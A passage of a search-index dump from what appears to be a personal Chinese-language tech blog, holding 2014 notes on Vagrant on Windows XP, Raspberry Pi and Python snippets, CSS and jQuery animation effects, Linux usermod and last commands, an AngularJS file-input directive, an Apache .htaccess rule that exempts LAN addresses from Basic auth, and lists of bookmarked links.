(Vagrant)","uri":"/blog/posts/logdown/2014-10-26-fixing-the-box-base-could-not-be-found-vagrant/"},{"categories":["Vagrant"],"content":"學校給我一台舊電腦(CPU:Sempron 64 3100+ 1.8Ghz，RAM:512MB) 於是我買了二手RAM:1G*2 300塊含運 電腦就順多了:D 由於灌ezgo11顯卡驅動沒有抓到via sig unichrome pro google一大堆都沒有解決 所以就試試XP下裝Vagrant，還是遇到問題Orz The box failed to unpackage properly. Google搜尋了一下，最終找到解決Error while adding Vagrant box in windows xp my solution was to download the basic_bsdtar.exe from here http://sourceforge.net/projects/mingw/files/MinGW/Extension/bsdtar/ and rename it to bsdtar.exe and place it in C:\\HashiCorp\\Vagrant\\embedded\\gnuwin32\\bin\\ 去http://sourceforge.net/projects/mingw/files/MinGW/Extension/bsdtar/ 下載檔案 到C:\\HashiCorp\\Vagrant\\embedded\\gnuwin32\\bin\\ 把bsdtar.exe取代掉 vagrant即可加入box ","date":"2014-10-25","objectID":"/blog/posts/logdown/2014-10-25-vagrant-in-windows-xp-cant-add-box/:0:0","tags":null,"title":"在Windows XP上vagrant不能加box","uri":"/blog/posts/logdown/2014-10-25-vagrant-in-windows-xp-cant-add-box/"},{"categories":["Raspberry PI"],"content":" f = open(\"/sys/class/thermal/thermal_zone0/temp\",\"r\") for t in f: print \"CPU temp:\"+t[:2]+\".\"+t[2:5] f.close() ","date":"2014-10-24","objectID":"/blog/posts/logdown/2014-10-24-raspberry-pi-using-the-python-query-temperature/:0:0","tags":null,"title":"[Raspberry Pi]使用Python查詢溫度","uri":"/blog/posts/logdown/2014-10-24-raspberry-pi-using-the-python-query-temperature/"},{"categories":["Python"],"content":" import urllib,random,re ip_regex = re.compile(\"(([0-9]{1,3}\\.){3}[0-9]{1,3})\") def public_ip(): ''' Returns your public IP address. Output: The IP address in string format. None if not internet connection available. ''' # List of host which return the public IP address: hosts = \"\"\"http://www.whatismyip.com/ http://adresseip.com http://www.aboutmyip.com/ http://www.ipchicken.com/ http://www.showmyip.com/ http://monip.net/ http://checkrealip.com/ http://ipcheck.rehbein.net/ http://checkmyip.com/ http://www.raffar.com/checkip/ http://www.thisip.org/ http://www.lawrencegoetz.com/programs/ipinfo/ http://www.mantacore.se/whoami/ http://www.edpsciences.org/htbin/ipaddress http://mwburden.com/cgi-bin/getipaddr http://checkipaddress.com/ http://www.glowhost.com/support/your.ip.php http://www.tanziars.com/ http://www.naumann-net.org/ http://www.godwiz.com/ http://checkip.eurodyndns.org/\"\"\".strip().split(\"\\n\") for i in range(3): host = random.choice(hosts) try: results = ip_regex.findall(urllib.urlopen(host).read(200000)) if results: return results[0][0] except: pass # Let's try another host return None print(public_ip()); ","date":"2014-10-24","objectID":"/blog/posts/logdown/2014-10-24-python-querying-native-ip/:0:0","tags":["Python","查詢本機IP"],"title":"[Python] 查詢本機IP","uri":"/blog/posts/logdown/2014-10-24-python-querying-native-ip/"},{"categories":["Apache"],"content":"UNO’s autoindex Apache autoindex style FancyIndex usr’z autoindex fuchcz’s apache-autoindex-theme ","date":"2014-10-24","objectID":"/blog/posts/logdown/2014-10-24-apache-autoindex-style-set/:0:0","tags":["Apache","autoindex"],"title":"Apache的autoindex風格設定","uri":"/blog/posts/logdown/2014-10-24-apache-autoindex-style-set/"},{"categories":["網站記錄"],"content":"路過的好站紀錄區 Programing Notes. http://joel-zhong.logdown.com/ RegexLib http://regexlib.com/Default.aspx ","date":"2014-10-24","objectID":"/blog/posts/logdown/2014-10-24-good-records/:0:0","tags":null,"title":"好站紀錄","uri":"/blog/posts/logdown/2014-10-24-good-records/"},{"categories":["Linux"],"content":"Linux預設帳號設定檔路徑 /etc/skel/ ","date":"2014-10-23","objectID":"/blog/posts/logdown/2014-10-23-list-of-linux-new-account-profile/:0:0","tags":null,"title":"Linux預設帳號設定檔路徑","uri":"/blog/posts/logdown/2014-10-23-list-of-linux-new-account-profile/"},{"categories":["CSS"],"content":"最近我同學問我這個背景移動特效要怎麼用 他以為是JQuery寫出來的 結果我找了老半天，原來是CSS3 animation:160s linear 0s normal none infinite animatedBackground name { animation: name duration timing-function delay iteration-count direction fill-mode play-state; } ※簡單筆記 name-\u003e @keyframe名稱 duration -\u003e 設定幾秒內跑完 timing-function -\u003e 開始到結束的速度 delay -\u003e 動畫開始前延遲幾秒 iteration-count -\u003e 重複執行幾次 direction -\u003e 執行完動畫後，接下來的動作模式 fill-mode -\u003e 動畫跑完後，該此物件擺設位置 play-state -\u003e 動畫狀態暫停 @keyframes /* Chrome, Safari, Opera */ @-webkit-keyframes mymove { from {top: 0px;} to {top: 200px;} } /* Standard syntax */ @keyframes mymove { from {top: 0px;} to {top: 200px;} } /* Chrome, Safari, Opera */ @-webkit-keyframes mymove { 0% {top: 0px; left: 0px; background: red;} 25% {top: 0px; left: 100px; background: blue;} 50% {top: 100px; left: 100px; background: yellow;} 75% {top: 100px; left: 0px; background: green;} 100% {top: 0px; left: 0px; background: red;} } /* Standard syntax */ @keyframes mymove { 0% {top: 0px; left: 0px; background: red;} 25% {top: 0px; left: 100px; background: blue;} 50% {top: 100px; left: 100px; background: yellow;} 75% {top: 100px; left: 0px; background: green;} 100% {top: 0px; left: 0px; background: red;} } 參考來源： http://yesdesigning.com/forum-63-1.html(特效) http://www.w3schools.com/cssref/css3_pr_animation-keyframes.asp ","date":"2014-10-23","objectID":"/blog/posts/logdown/2014-10-23-css-css3-animations-animation-and-special-effects/:0:0","tags":["CSS","animation"],"title":"[CSS] CSS3 Animations動畫特效","uri":"/blog/posts/logdown/2014-10-23-css-css3-animations-animation-and-special-effects/"},{"categories":["CSS"],"content":"text-overflow: ellipsis; text-overflow: clip|ellipsis|string|initial|inherit; 資料來源： http://www.w3schools.com/cssref/css3_pr_text-overflow.asp ","date":"2014-10-23","objectID":"/blog/posts/logdown/2014-10-23-csstext-overflow-text-overflow-characters-too-often-substituted-for/:0:0","tags":["CSS","text-overflow"],"title":"[CSS]text-overflow - 文字太常溢出的字元替代為...","uri":"/blog/posts/logdown/2014-10-23-csstext-overflow-text-overflow-characters-too-often-substituted-for/"},{"categories":["Linux"],"content":" 修改使用者帳號資訊（管理者） usermod -l newname username　# 變更使用者帳號名稱 usermod -o -u 101 username　# 變更使用者 UID usermod -g users username　# 變更使用者主要群組 usermod -G mis,sales username　# 變更使用者次要群組 usermod -c “manager” username　# 修改使用者註解內容 usermod -m -d /home/user username　# 變更使用者家目錄路徑 usermod -s /usr/bin/ksh username　# 變更使用者預設 Shell usermod -e 1/1/2010 username　# 變更使用者過期期限 usermod -p FEeig.jYifke username　# 變更使用者密碼 來源：http://blog.yam.com/gavint/article/23264761 Linux usermod -p 修改用户密码 passwd也可以修改口令，但是这是一种交互式的方式，需要用户干预。当然也可以使用重定向或者管道向passwd喂数据，暂且不提。 linux下增加用户的命令是useradd，修改用户的命令是usermod，二者都有一个参数 –p，这个参数可以直接指定用户的口令，但是需要注意的是，这个口令并不是明文，而是经过加密的一个字串。 linux下可以用python编辑器通过编程的方法得到加密字串（linux下用python命令启动编辑器）： 下面是一个完整的过程，蓝色字体的是用户输入的命令，而红色的是系统输出。 [root@linux ~]# python Python 2.3.4 (#1, Oct 26 2004, 16:42:40) [GCC 3.4.2 20041017 (Red Hat 3.4.2-6.fc3)] on linux2 Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. import crypt;print(crypt.crypt(\"your password\",\"ab\")); ab62Jfo2yjBEo \u003e\u003e\u003e 上面用户输入信息中的“your password”可以替换为需要加密的口令，“ab”可替换为任意的两个大小写字符或者数字，而“ab62Jfo2yjBEo”就是加密后的密文。 一个简单的例子如下： useradd –p ab62Jfo2yjBEo testuser usermod –p ab62Jfo2yjBEo testuser 來源：http://www.cppblog.com/aaxron/archive/2010/12/02/135251.html ","date":"2014-09-15","objectID":"/blog/posts/logdown/2014-09-15-linux-use-usermod-to-modify-the-users-parameters-and-data/:0:0","tags":["usermod","Linux"],"title":"Linux 利用 usermod 修改使用者的參數和資料","uri":"/blog/posts/logdown/2014-09-15-linux-use-usermod-to-modify-the-users-parameters-and-data/"},{"categories":["網站記錄"],"content":"收集一些網路覺得不錯的東西，會記錄下面。 希望有時間要找過去想看的，也是非常方便的一件事。 2014/12 使瀏覽器的上一頁按鍵無效 http://windwaterbo-blog.logdown.com/posts/245123-disable-back-button-in-browser-using-javascript 一段白爛往事(O(n^2)降成O(n)) http://blog.rayer.idv.tw/posts/245160-for-some-stupid-memories HTML5 的 File 相關物件 http://jamestw.logdown.com/posts/245135-html5-file-api [Python] 套件管理程式 http://lucianyo.logdown.com/posts/245094 Android讀取外部sdcard圖片 http://shamangary-blog.logdown.com/posts/245120-android-reads-external-sdcard-pictures jquery Form表單修改後未儲存提示 http://joel-zhong.logdown.com/posts/2014/12/02/jquery-alert-for-unsaved-changes-in-form Vim.js http://coolwanglu.github.io/vim.js/experimental/vim.html Debian Java-Bridge精簡安裝(免裝Tomcat)[PHP能執行JAVA] http://vega02.blogspot.tw/2010/10/debian-java-bridgetomcat.html Java optional parameters(差點忘記這玩意，但好像只有JAVA有) http://stackoverflow.com/questions/1737350/java-optional-parameters T客邦目前使用的 code 品質輔助工具 http://ascendbruce.logdown.com/posts/243326-code-quality-tool-used-in-techbang ReactJS 初學心得 http://www.kvzhuang.net/posts/245658-reactjs-beginner-tips PhoneGap 09 使用Plugman管理Plugins http://blog.csdn.net/jacob_wang520/article/details/18319471 程式碼準則 by @mdo http://lisp.es/code-guide/ 快快樂樂用Homestead (PHP Framework - Laravel) http://www.slideshare.net/warfan/homestead-42836254 discuz 的加密與解密函數authcode解析 http://www.wkii.org/discuz-encryption-and-decryption-functions-authcode-analysis.html Python版本的autocode加解密函数 http://bbs.bccn.net/thread-300363-1-1.html 關於配色這回事 http://baggywalking.blogspot.tw/2008/02/blog-post_560.html 淺談Spine與Angular框架比較 http://jazznote.logdown.com/posts/247111-framework-of-the-discussion-on-the-spine [R-Pi] 自動載掛外接式硬碟 http://worldofwen.logdown.com/posts/247476-r-pi-automatically-load-hanging-on-an-external-hard-drive ReactJS Examples, Demos, Code http://react.rocks/ ReactStar http://rawgit.com/ndyag/react-rater/master/example/index.html [Python] IPython簡單使用技巧速記 http://enginebai.logdown.com/posts/247825/ipython-tips 2014/11 使用 Mac 連線到 Raspberry Pi (USB to TTL) http://chsien.logdown.com/posts/2014/07/05/mac-raspberry-pi-usb Rails 與 AngularJS 混搭風 http://chsien.logdown.com/posts/2014/10/30/rails-and-angularjs-mixed-wind-start Is [web] down for everyone or just me? http://www.downforeveryoneorjustme.com/ position: sticky 註： Firefox 有支援 position: sticky ； Safari 支援 position: -webkit-stikcy http://html5-demos.appspot.com/static/css/sticky.html http://jsfiddle.net/jaceju/7ak0714c/ 使用Skrollr.js實作視差滾動 http://blog.friendo.com.tw/posts/240944-prallax-scrolling-by-skrollr OSQuery http://osquery.io/ https://github.com/facebook/osquery Fake images please? http://fakeimg.pl/ 使用 Screen 指令操控 UNIX/Linux 終端機的教學與範例 http://www.gtwang.org/2013/11/screen-command-examples-to-manage-linux-terminals.html http://www.dotblogs.com.tw/bowwowxx/archive/2014/08/30/146410.aspx selenium http://www.seleniumhq.org/ http://www.jaceju.net/blog/archives/1293/ https://coscup.hackpad.com/R2-Day-1-719-XLzFyRVl62h Scrapy http://scrapy.org/ BeautifulSoup http://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html http://kilfu0701.blogspot.tw/2011/03/python-beautifulsoup.html http://whhnote.blogspot.tw/2011/01/python-beautifulsouphtml.html sql.js ※雲蝦米看到的神東西 https://github.com/kripken/sql.js http://kripken.github.io/sql.js/documentation/ http://kripken.github.io/sql.js/GUI/ https://github.com/aitjcize/Cloud-Liu/blob/master/app/static/js/cloud-liu-loader.js atob、btoa(encode/decode base64) http://www.w3schools.com/jsref/met_win_atob.asp 那些 CSS 偽元素可以幫你做的 10 個效果 http://blog.mukispace.com/pseudo-elements-10-examples/ 網路及平台服務程式設計 http://ccsp.ntumobile.org/syllabus.html NodeJS入門 http://www.nodebeginner.org/index-zh-tw.html codeacdemy http://www.codecademy.com/ 學git的好地方 http://www.codecademy.com/ Vim大冒險 http://vim-adventures.com/ OAUTH2 For Browser(Hello.js) http://jasteralan.logdown.com/posts/241694-oauth2-for-browser 簡單做好中文排版 http://binb.tw/ebookmag/00/00.html CSS3 pointer-events介绍 http://www.qianduan.net/css3-pointer-event-description.html git 日常操作 http://jamestw.logdown.com","date":"2014-09-03","objectID":"/blog/posts/logdown/2014-09-03-2014-random-notes/:0:0","tags":null,"title":"2014  隨意筆記紀錄","uri":"/blog/posts/logdown/2014-09-03-2014-random-notes/"},{"categories":["網站記錄"],"content":"2014/09 Bootsnipp 收集了很多常見的 UI 範例，並提供 HTML Snippets 供我們直接參考使用。 http://bootsnipp.com/ PHP 應用程式(1): 防禦型程式寫法 http://lab.asika.tw/programming/theories-and-concepts/40-strong-php-1-defensive-programming.html 本文介紹了幾個工具，讓不善於設計的朋友也可以製作出自己的圖形化資訊。 http://www.noupe.com/design/10-tools-to-create-beautiful-infographics-and-visualize-data-84300.html HTML5 Page Visibility API http://code.tutsplus.com/articles/html5-page-visibility-api--cms-22021 本文完整收集了所有 CSS 置中的解決方案 http://css-tricks.com/centering-css-complete-guide/ 本文透過一些情境的介紹，教你如何使用 JavaScript 讓網站更聰明，更加個人化，這些情境包括： 透過 IP 對應的地理位置 時間 (星期幾) 拜訪的次數 當然還有其他資訊可以參考，最重要的是讓訪客感覺這個網站會依照他的狀況而有不同的呈現。 http://www.sitepoint.com/website-personalization/ FocusPoint.js https://github.com/jonom/jquery-focuspoint 本文完整地介紹了該怎麼透過 Google Analytics ，幫我們分析出網站的 RWD 是否有正確作用在用戶的瀏覽器上。 http://www.smashingmagazine.com/2014/08/28/responsive-web-design-google-analytics/ Heatmap.js http://www.patrick-wied.at/static/heatmapjs/ Ment.io 是一個可以讓我們在文字框中使用 @ 和 # 做出自動完成效果的 AngularJS 模組 http://jeff-collins.github.io/ment.io/ uilang http://uilang.com/ Cross-site HTTP request (CROS) https://developer.mozilla.org/zh-TW/docs/HTTP/Access_control_CORS Sublime 套件 https://github.com/titoBouzout/SideBarEnhancements Firebase https://www.firebase.com/ DreamFactory http://bit.ly/dreamfactory-com html2canvas http://html2canvas.hertzen.com/examples.html parallax scrolling http://jquer.in/category/jquery-plugins-for-awesome-scrolling-and-scrollbars-on-websites/ http://alvarotrigo.com/fullPage/ http://www.webhostingreviewboards.com/design/10-best-jquery-plugins-for-scrolling-effects/ http://www.devfloat.com/jquery-parallax-scrolling-tutorials/ http://www.franckmaurin.com/the-parallax-effects-with-jquery/ ","date":"2014-09-03","objectID":"/blog/posts/logdown/2014-09-03-2014-random-notes/:1:0","tags":null,"title":"2014  隨意筆記紀錄","uri":"/blog/posts/logdown/2014-09-03-2014-random-notes/"},{"categories":["Linux"],"content":"在Google搜尋到解決方法Linux DHCP DNS設定問題 有空測試一下，先記錄一下。 主機使用 DHCP 取得 IP，有時後會出現明明就設定好了，但是重開機後DNS的設定又跑掉的問題。 若是有此問題，請修改該網卡的設定。 設定完DNS後，請修改網卡的部份。(假設網卡為eth0) 請加入PEERDNS=no後重啟網路或重開機就行了。 詳細內容請參考http://blog.faq-book.com/?p=2717 ","date":"2014-08-25","objectID":"/blog/posts/logdown/2014-08-25-linux-dhcp-dns-to-turn-off-problem/:0:0","tags":["Linux","DHCP","DNS"],"title":"Linux DHCP DNS重開機跑掉的問題","uri":"/blog/posts/logdown/2014-08-25-linux-dhcp-dns-to-turn-off-problem/"},{"categories":["網頁特效"],"content":"最近發現JQuery 有人用Animate做背景動態效果 $('body').stop().animate({backgroundColor:'#00b1ff'},500); 自已用plunker測試發現不能使用 原來需要裝一個套件才能用 All animated properties should be animated to a single numeric value, except as noted below; most properties that are non-numeric cannot be animated using basic jQuery functionality (For example, width, height, or left can be animated but background-color cannot be, unless the jQuery.Color() plugin is used). Property values are treated as a number of pixels unless otherwise specified. The units em and % can be specified where applicable. jquery-color套件 套件能用Animate套用CSS屬性如下 Supported properties backgroundColor, borderBottomColor, borderLeftColor, borderRightColor, borderTopColor, color, columnRuleColor, outlineColor, textDecorationColor, textEmphasisColor ","date":"2014-07-09","objectID":"/blog/posts/logdown/2014-07-09-jquery-animate-notes/:0:0","tags":["animate"],"title":"JQuery相關Animate function筆記","uri":"/blog/posts/logdown/2014-07-09-jquery-animate-notes/"},{"categories":["網頁特效"],"content":"Stop() Stop()能暫停animate動作 ","date":"2014-07-09","objectID":"/blog/posts/logdown/2014-07-09-jquery-animate-notes/:1:0","tags":["animate"],"title":"JQuery相關Animate function筆記","uri":"/blog/posts/logdown/2014-07-09-jquery-animate-notes/"},{"categories":["網頁特效"],"content":"delay() 延遲animate動作時間 簡單滑入滑出動作範例 $(\"h1\").hover(function(){ $(this).fadeTo(0, 0.7); },function(){ $(this).fadeTo(0, 1.0); }); ","date":"2014-07-09","objectID":"/blog/posts/logdown/2014-07-09-jquery-animate-notes/:2:0","tags":["animate"],"title":"JQuery相關Animate function筆記","uri":"/blog/posts/logdown/2014-07-09-jquery-animate-notes/"},{"categories":["網頁特效"],"content":"最近逛到未確認進行式動畫官網 看到背景是動態畫面，第一個直覺這是Flash 但右鍵不是!!!! 奇怪就算是HTML5播放影片右鍵應該可以控制影片 簡單看了一下原始碼 是用HTML5裡的Video來播放了，但怎麼沒辦法右鍵控制??? 其實最外面的那一層**#headWrap**把Video擋住了 其實div還用滿多z-index圖層 目前搞不懂#headWrap的z-index:20 Video的z-index:40 #headWrap可以在Video上面 最後，找到z-index playground 雖然左邊英文看不懂orz，但是簡單玩了一下右邊圖層關係 某div裡的div的z-index跟外面div裡的z-index比較 會對照某div裡的div的z-index的parent div z-index去跟外面比較 而非div裡面的z-index 此說法可能有錯誤 所以未確認進行式動畫官網 #headWrap的z-index:20 雖然Video的z-index:40，但是外層的#visualWrap的z-index:10 所以#headWrap就在上面 雖然有找到CSS z-index 屬性的使用方法和層級樹的概念 但親身玩一下z-index playground才會比較清楚 話說看暗殺教室和未確認進行式官網的CSS寫法 感覺網頁設計師是用SASS寫出來的0.0 可惜目前CSS能力不足，可能沒辦法碰此部份orz ","date":"2014-07-06","objectID":"/blog/posts/logdown/2014-07-06-using-films-to-do-a-background-animation/:0:0","tags":["z-index","position"],"title":"利用影片來做背景動態效果","uri":"/blog/posts/logdown/2014-07-06-using-films-to-do-a-background-animation/"},{"categories":["網頁特效"],"content":"前幾天逛到暗殺教室動畫官網 指要把滑鼠移到暗殺老師頭，旁邊就會跑出說話框 然而還可以貼其靠左置中 而且持續拉螢幕一直放大，中間圖片背景還是不變(置中) 正常div置中都是用 width:50%; margin:0px auto; 不過 完完全全不知道是怎麼做到了 想了很久其實很簡單 background-repeat: no-repeat; background-position: center top; 當出碰CSS沒有印象有background-position這個東西 接下來，說話框他貼齊的方法是用table .fukidashi table { height: 305px; width: 225px; } .fukidashi td { text-align: left; vertical-align: middle; } 再好幾年前看到網頁設計要避免使用table 不過這個方法還滿簡單對齊 置於動態效果是用 $(\"#fukidashi\").hover(function(){ $(\".fukidashi img\").stop().animate({\"width\":\"215px\",\"height\":\"305px\"},100); }, function(){ $(\".fukidashi img\").stop().animate({\"width\":\"1px\",\"height\":\"1px\"},200); }); 沒想到JQuery的animate function可以做出此特效 最後手動實例一下吧 實例成果 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003clink rel=\"stylesheet\" href=\"style.css\"\u003e \u003cscript data-require=\"jquery@2.1.1\" data-semver=\"2.1.1\" src=\"//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.1/jquery.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"script.js\"\u003e\u003c/script\u003e \u003clink href=\"style.css\" rel=\"stylesheet\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003e天線寶寶說你好\u003c/h1\u003e \u003cdiv class=\"wrap\"\u003e \u003cdiv class=\"main\"\u003e \u003cdiv class=\"image\"\u003e\u003c/div\u003e \u003cdiv class=\"word\"\u003e \u003ctable\u003e\u003ctr\u003e\u003ctd\u003e 你好 \u003c/td\u003e\u003c/tr\u003e \u003c/table\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e // Code goes here $(document).ready(function(e) { $(\"div.image\").hover(function(){ $(\".word\").stop().animate({\"font-size\":\"50px\"},100); }, function(){ $(\".word\").stop().animate({\"font-size\":\"1px\"},200); }); }); div.image { position:absolute; top:300px; left:300px; background-image: url('data:image/png;base64,....); width: 189px; height: 240px; } div.wrap { height:600px; background-repeat: no-repeat; background-position: center top; background-image: url('data:image/png;base64,...); } div.word table{ width:100%; height:100%; } div.word{ position:absolute; width:200px; height:100px; top:200px; left:290px; font-size:1px; } div.word td{ text-align:center; vertical-align:bottom; } div.main{ position:relative; height: 600px; } 最後做這個範例也花了我不少時間 由於Easy GO裡的GIMP和Krita都不太會使用… 耗了我滿久的時間(本人美功也很爛) 然後欄的用說話框，就改成字體放大 這個實例可能有點弱。哈。 ","date":"2014-07-06","objectID":"/blog/posts/logdown/2014-07-06-talk-box-zoom-effects/:0:0","tags":["vertical-align"],"title":"說話框放大縮小特效、背景置中","uri":"/blog/posts/logdown/2014-07-06-talk-box-zoom-effects/"},{"categories":["網頁特效"],"content":"最近看到一些日本動畫網站做的越來越厲害 以前看到動態以為是Flash做出來的東西 但仔細一看，竟然是HTML5+JavaScript合出來的東西 於是我對一些網站製作手法開始有興趣了 其實我大學的時候沒打算去碰前端美功東西 因為知道自已沒有美功天份 加上寫程式就要發很多時間(自已能力可能不足…orz) 所以大學程式介面都不是能看的 之前大學二年級因為覺得當時AJAX很神奇 但JavaScript真的沒有什麼碰過，買了JavaScript大全傳說中的聖經 而且書某些地方還滿難的，所以就沒繼續下去 然後就看到JQuery，當出某網站寫JQuery 寫的少，做的多，跨任合平台 當時jQuery中文書很少，只有一本… 網頁設計．愛上jQuery 英文苦手的我沒辦法讀網路相關英文文件，之後查到有相關中文書，就去學校圖書館推薦，苦等了三個月終於書來了 由於沒有相關CSS Selector觀念，再加上當時碰過程式語言只有Java、PHP 所以接觸JQuery程式語言寫法$(\"id or elemnt or css selector\") ，說真的不知道耗我幾天的時間 我完完全全都是靠自已測試好幾次，才了解要怎麼使用 最後的困難，就是利用AJAX實現GET、POST 由於當時不會使用Firebug，所以瀏覽器點下沒動作就傻傻到裡面去看程式碼有沒有問題 不像現在Firefox、Chrome有Ctrl+Alt+i就有網頁開發工具方便(也許那時候以前有也說不定orz) 最近這幾年JQuery看到很多網站應用越來越多了 雖然我現在還是覺得JQuery能力不是說很好，每次寫的程式都很臭長，但是JQuery已經可以滿足我目前控制需求 當出記畫打算從JQuery→JavaScript，但沒想到JQuery滿足我後，我之後都沒去碰JavaScript了 有點後悔當出要先從JavaScript→JQuery 最後 我當然不是要當copycat 我希望看到別人不錯的特效，查看原始碼看如何實現的 加以記錄，雖然我目前打算應該打算朝後端工程式為目標 但是最近Web相關技術(Bootstrap、AnjularJS…等等)都越來越紅，紅到我都感到有興趣了 也許未來我做網站可能會用到，也許我跑去當前端工程師也說不定… 未來的事誰知道… ","date":"2014-07-05","objectID":"/blog/posts/logdown/2014-07-05-web-effects-notes/:0:0","tags":null,"title":"記錄網頁特效動機","uri":"/blog/posts/logdown/2014-07-05-web-effects-notes/"},{"categories":["AngularJS"],"content":"http://www.dotblogs.com.tw/regionbbs/archive/2012/06/28/html5.file.api.aspx http://odetocode.com/blogs/scott/archive/2013/07/05/a-file-input-directive-for-angularjs.aspx http://stackoverflow.com/questions/16579427/html5-file-upload-with-angularjs http://plnkr.co/edit/JPxSCyrxosVXfZnzEIuS?p=preview http://plnkr.co/edit/HEA7wYq8Uv0Ee0J4SX7u?p=preview html \u003c!doctype html\u003e \u003chtml ng-app=\"plunker\" \u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003eAngularJS Plunker\u003c/title\u003e \u003cscript\u003edocument.write('\u003cbase href=\"' + document.location + '\" /\u003e');\u003c/script\u003e \u003clink rel=\"stylesheet\" href=\"style.css\"\u003e \u003cscript src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.0.6/angular.js\"\u003e\u003c/script\u003e \u003cscript src=\"app.js\"\u003e\u003c/script\u003e \u003c/head\u003e \u003cbody ng-controller=\"MainCtrl\"\u003e \u003cinput type=\"file\" filelist-bind multiple=\"multiple\" name=\"files\"/\u003e \u003cbr\u003e files : \u003cpre\u003e{{ files | json }}\u003c/pre\u003e \u003c/body\u003e \u003c/html\u003e var app = angular.module('plunker', []); app.directive('filelistBind', function() { return function( scope, elm, attrs ) { elm.bind('change', function( evt ) { scope.$apply(function() { name =\"\"; for(i=0;i\u003cevt.target.files.length;i++){ alert(evt.target.files[i].name); name += evt.target.files[i].name; } scope[ attrs.name ] = name; }); }); }; }); app.controller('MainCtrl', function($scope) { $scope.name = 'World'; }); http://stackoverflow.com/questions/16207202/required-attribute-not-working-with-file-input-in-angular-js http://jsfiddle.net/danielzen/utp7j/ ","date":"2014-07-03","objectID":"/blog/posts/logdown/2014-07-03-read-angularjs-loading-file-information/:0:0","tags":null,"title":"AngularJS讀取載入檔案資訊","uri":"/blog/posts/logdown/2014-07-03-read-angularjs-loading-file-information/"},{"categories":["Linux"],"content":"今天在宿舍連家裡的動物機連不進去，後來就用真實IP連線去了 登入後馬上下意識用last去看一下登入狀況 結果發現只有一條剛剛登入的訊息!!! 後來看了一下鳥哥一些常見指令： last, lastlog, dmesg [root@linux ~]# last -n number [root@linux ~]# last -f filename 參數： -n ：我們知道 last 會讀出這個月的資料，若資料量太大，可使用 -n 來嚴格要求 所以顯示的筆數即可。例如 20 筆資料： last -n 20 或 last -20 均可。 -f ：last 預設讀出 /var/log/wtmp 這個檔案，但是我們可以透過 -f 讀取不同的 登錄檔資訊喔！ 範例： 範例一：將上個月的資料讀出，僅讀出 5 筆資料時？ [root@linux ~]# last -n 5 -f /var/log/wtmp.1 dmtsai2 pts/2 Mon Oct 24 14:18 - 14:18 (00:00) dmtsai2 work:0 work Mon Oct 24 14:18 gone - no logout dmtsai2 work:0 work Mon Oct 24 14:18 - 14:18 (00:00) dmtsai2 pts/2 Mon Oct 24 14:18 - 14:18 (00:00) dmtsai2 work:0 work Mon Oct 24 14:18 - 14:18 (00:00) 舊的登入資訊會存到wtmp.1那邊 致於no-ip不能連的原因是似乎no-ip那邊出點狀況。詳細原因 NOTICE: Our domains are still experiencing outages due to the Microsoft takedown. Please read our formal statement on the matter. 看來動物機沒被hack :) 白擔心了一下 今日發現lastlog實用的指令，查詢所有帳號最後一次登入的時間 可惜這個指令目前用不太到 ","date":"2014-07-01","objectID":"/blog/posts/logdown/2014-07-01-last-login-information-is-gone/:0:0","tags":["Linux","last"],"title":"last登入資訊不見了!!!","uri":"/blog/posts/logdown/2014-07-01-last-login-information-is-gone/"},{"categories":["網站記錄"],"content":"http://www.webmart.tw/blog/15-best-bootstrap-tools-for-designers/ http://bootswatch.com/ ","date":"2014-06-26","objectID":"/blog/posts/logdown/2014-06-26-bootstrap-good-tools-website/:0:0","tags":null,"title":"Bootstrap相關不錯的工具網站","uri":"/blog/posts/logdown/2014-06-26-bootstrap-good-tools-website/"},{"categories":["HTML"],"content":"最近在想有沒有瀏覽器播放MP4控制播放時間 結果一搜尋還真的有耶!!! 在(Start HTML5 video at a particular position when loading?)[http://stackoverflow.com/questions/5981427/start-html5-video-at-a-particular-position-when-loading]這篇找到相關方法 http://www.yoursite.com/yourfolder/yourfile.mp4#t=5,15 後來還發現能用00:00:00格式 http://www.yoursite.com/yourfolder/yourfile.mp4#t=0:00:00,0:01:00 (Media Fragment)[http://www.w3.org/TR/media-frags/] ","date":"2014-06-25","objectID":"/blog/posts/logdown/2014-06-25-play-the-movie-browser-controls-the-start-time-and-end-time/:0:0","tags":["mp4","video"],"title":"瀏覽器播放影片控制開始時間和結束時間","uri":"/blog/posts/logdown/2014-06-25-play-the-movie-browser-controls-the-start-time-and-end-time/"},{"categories":["Apache"],"content":"最近厭煩在家還要輸入Basic認證才能線上聽到我的Raspberry Pi上音樂 看了大多數htaccess設定 都沒辦法達成我想要的結果 最後在.htaccess - Allow IP address without authentication - Stack Overflow這篇找到正解 Order deny,allow Deny from all AuthName \"Please type password\" AuthType Basic AuthUserFile \"/var/www/player/.htpasswd\" require valid-user Allow from 192.168.0.0/24 Satisfy Any 以後在家就不用打認證:D htaccess相關設定文件 在線上製作.htaccess Apache的Satisfy详解 常見的 .htaccess 使用技巧 ","date":"2014-06-21","objectID":"/blog/posts/logdown/2014-06-21-set-regional-ip-from-apache-basic-authentication-directly-into-the-webpage/:0:0","tags":["Http Auth","Apache",".htaccess"],"title":"Apache設定區域IP免BASIC認證就直接進入網頁","uri":"/blog/posts/logdown/2014-06-21-set-regional-ip-from-apache-basic-authentication-directly-into-the-webpage/"},{"categories":["CSS"],"content":"今天用平板電腦看Glayer 發現橫向、直向看某圖大小非常不一樣。 起先我以為是我的錯覺，在經過用Firefox確實大小不一樣。 本來在想是用什麼巫術才能變成這樣，Bootstrap?HTML? 沒想到是CSS的max-width的關係 之前看到CSS的max-width一直都不知道要試用於哪裡 今天總算知道了:D ","date":"2014-06-14","objectID":"/blog/posts/logdown/2014-06-14-moderate-css-adjustments-for-different-desktop-resolutions-methods-max-width/:0:0","tags":["max-width","CSS"],"title":"不同桌面解析度用CSS調整圖適中的方法(max-width)","uri":"/blog/posts/logdown/2014-06-14-moderate-css-adjustments-for-different-desktop-resolutions-methods-max-width/"},{"categories":["AngularJS"],"content":"AngularJS是一個MVC架構JavaScript Framework，是這幾年比較紅的。詳細介紹維基 最近簡單做了簡單輸入檔案計算，如下 